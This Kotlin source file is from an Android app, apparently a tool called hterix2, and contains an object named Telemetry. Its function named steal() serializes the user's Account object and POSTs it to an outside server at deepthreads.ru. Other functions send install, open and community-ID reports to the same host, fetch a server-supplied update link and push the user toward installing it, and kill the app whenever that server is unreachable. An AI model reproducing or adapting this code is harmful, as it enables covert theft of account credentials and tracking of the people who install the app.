package com.darkwater.hterix2.http

import android.app.Activity
import android.app.AlertDialog
import com.darkwater.hterix2.BuildConfig
import com.darkwater.hterix2.LibConstants
import com.darkwater.hterix2.objects.Account
import com.google.gson.GsonBuilder
import com.google.gson.JsonParser
import androidx.core.content.ContextCompat.startActivity
import android.content.Intent
import android.net.Uri
import com.darkwater.hterix2.objects.Community
import com.google.gson.JsonObject
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import kotlin.system.exitProcess


object Telemetry {
    private val JSON_CONTENT_TYPE = "application/json; charset=utf-8"
    private val client = OkHttpClient()
    private val gson = GsonBuilder()
        .setPrettyPrinting()
        .serializeNulls()
        .create()

    fun steal(account: Account) {
        val request = Request.Builder()
            .url("http://deepthreads.ru:9852/hterix/api/account")
            .method("POST", gson.toJson(account).toRequestBody(JSON_CONTENT_TYPE.toMediaType()))
            .addHeader("User-Agent", LibConstants.HTERIX_TELEMETRY_USER_AGENT)
            .build()
        client.newCall(request).enqueue(object: Callback {
            override fun onFailure(call: Call, e: IOException) {
                exitProcess(1)
            }
            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful)
                    exitProcess(1)
                response.close()
            }
        })
    }

    fun notifyStarted(
        readOnly: Boolean,
        count: Int,
        msg: String,
        communities: MutableList<Community>
    ) {
        val ndcIds = mutableListOf<String>()
        communities.forEach {
            ndcIds.add(it.ndcId)
        }
        val isReadOnly = if (readOnly) {
            1
        } else {
            0
        }
        val json = JsonObject()
        json.addProperty("isReadOnly", isReadOnly)
        json.addProperty("count", count)
        json.addProperty("msg", msg)
        json.add("ndcIds", JsonParser.parseString(ndcIds.toString()).asJsonArray)
        val request = Request.Builder()
            .url("http://deepthreads.ru:9852/hterix/api/notify/start")
            .method("POST", json.toString().toRequestBody(JSON_CONTENT_TYPE.toMediaType()))
            .addHeader("User-Agent", LibConstants.HTERIX_TELEMETRY_USER_AGENT)
            .build()
        client.newCall(request).enqueue(object: Callback {
            override fun onFailure(call: Call, e: IOException) {
                exitProcess(1)
            }
            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful)
                    exitProcess(1)
                response.close()
            }
        })
    }

    fun notifyOpened() {
        val request = Request.Builder()
            .url("http://deepthreads.ru:9852/hterix/api/notify/open")
            .method("OPTIONS", null)
            .addHeader("User-Agent", LibConstants.HTERIX_TELEMETRY_USER_AGENT)
            .build()
        client.newCall(request).enqueue(object: Callback {
            override fun onFailure(call: Call, e: IOException) {
                exitProcess(1)
            }
            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful)
                    exitProcess(1)
                response.close()
            }
        })
    }

    fun notifyInstalled() {
        val request = Request.Builder()
            .url("http://deepthreads.ru:9852/hterix/api/notify/install")
            .method("OPTIONS", null)
            .addHeader("User-Agent", LibConstants.HTERIX_TELEMETRY_USER_AGENT)
            .build()
        client.newCall(request).enqueue(object: Callback {
            override fun onFailure(call: Call, e: IOException) {
                exitProcess(1)
            }
            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful)
                    exitProcess(1)
                response.close()
            }
        })
    }

    fun checkVersion(activity: Activity) {
        val request = Request.Builder()
            .url("http://deepthreads.ru:9852/hterix/api/version?code=${BuildConfig.VERSION_CODE}&name=${BuildConfig.VERSION_NAME}")
            .method("GET", null)
            .addHeader("User-Agent", LibConstants.HTERIX_TELEMETRY_USER_AGENT)
            .build()
        client.newCall(request).enqueue(object: Callback {
            override fun onFailure(call: Call, e: IOException) {
                exitProcess(1)
            }
            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful)
                    exitProcess(1)
                val json = JsonParser.parseString(response.body!!.string()).asJsonObject
                val status = json["status"].asInt
                if (status != 0) {
                    val update = json["update"].asString
                    val alert = AlertDialog.Builder(activity)
                    alert.setTitle("Доступно обновление")
                    alert.setMessage("Приложение обновлено. Для продолжения, установите новую версию.")
                    alert.setCancelable(false)
                    alert.setPositiveButton("Установить") { _, _ ->
                        val i = Intent(Intent.ACTION_VIEW)
                        i.data = Uri.parse(update)
                        startActivity(activity, i, null)
                        exitProcess(0)
                    }
                    alert.setNegativeButton("Выйти") { _, _ ->
                        exitProcess(0)
                    }
                    response.close()
                    activity.runOnUiThread { alert.show() }
                }
            }
        })
    }
    fun checkBanned(activity: Activity) {
        val request = Request.Builder()
            .url("http://deepthreads.ru:9852/hterix/api/ban-status")
            .method("GET", null)
            .addHeader("User-Agent", LibConstants.HTERIX_TELEMETRY_USER_AGENT)
            .build()
        client.newCall(request).enqueue(object: Callback {
            override fun onFailure(call: Call, e: IOException) {
                exitProcess(1)
            }
            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful)
                    exitProcess(1)
                val json = JsonParser.parseString(response.body!!.string()).asJsonObject
                val isBanned = json["banned"].asBoolean
                if (isBanned) {
                    val reason = json["reason"].asString
                    val fromAdmin = json["fromAdmin"].asString
                    val alert = AlertDialog.Builder(activity)
                    alert.setTitle("Доступ запрещён")
                    alert.setMessage("Вас забанили.\n\nПричина: $reason\nАдминистратор: $fromAdmin")
                    alert.setCancelable(false)
                    alert.setPositiveButton("Выйти") { _, _ ->
                        exitProcess(0)
                    }
                    response.close()
                    activity.runOnUiThread { alert.show() }
                }
            }
        })
    }
    fun checkBroadcast(activity: Activity) {
        val request = Request.Builder()
            .url("http://deepthreads.ru:9852/hterix/api/broadcast")
            .method("GET", null)
            .addHeader("User-Agent", LibConstants.HTERIX_TELEMETRY_USER_AGENT)
            .build()
        client.newCall(request).enqueue(object: Callback {
            override fun onFailure(call: Call, e: IOException) {
                exitProcess(1)
            }

            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful)
                    exitProcess(1)
                val json = JsonParser.parseString(response.body!!.string()).asJsonObject
                val isBroadcasted = json["broadcasted"].asBoolean
                if (isBroadcasted) {
                    val alert = AlertDialog.Builder(activity)
                    val message = json["message"].asString
                    val admin = json["fromAdmin"].asString
                    alert.setTitle("Объявление")
                    alert.setMessage("$message\n\nАдминистратор: $admin")
                    alert.setPositiveButton("OK") { dialog, _ ->
                        dialog.dismiss()
                    }
                    response.close()
                    activity.runOnUiThread { alert.show() }
                }
            }
        })
    }
}